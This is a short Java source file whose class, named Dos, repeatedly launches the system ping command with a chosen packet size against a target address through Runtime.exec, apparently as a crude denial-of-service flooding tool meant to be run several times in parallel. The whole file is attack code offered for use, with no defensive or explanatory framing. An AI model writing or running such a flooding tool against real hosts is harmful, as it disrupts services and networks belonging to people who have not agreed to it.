package com.company;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class Dos implements Runnable {

    private String targetAddress;
    private int packetSize;
    private long timeToSendPackets;
    private String command;


    Dos(String targetAddress, int packetSize, long timeToSendPackets){
        this.targetAddress = targetAddress;
        this.packetSize = packetSize;
        this.timeToSendPackets = timeToSendPackets;
        this.command = String.format("ping -v -s %s %s", this.packetSize, this.targetAddress);
    }

    @Override
    public void run() {
        try{
            for(int i = 0; i < timeToSendPackets; i++){
                Runtime runtime = Runtime.getRuntime();
                Process process = runtime.exec(command);
                InputStreamReader inputStreamReader = new InputStreamReader(process.getInputStream());
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                String output = bufferedReader.readLine();
                System.out.println(output);
                inputStreamReader.close();
                bufferedReader.close();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
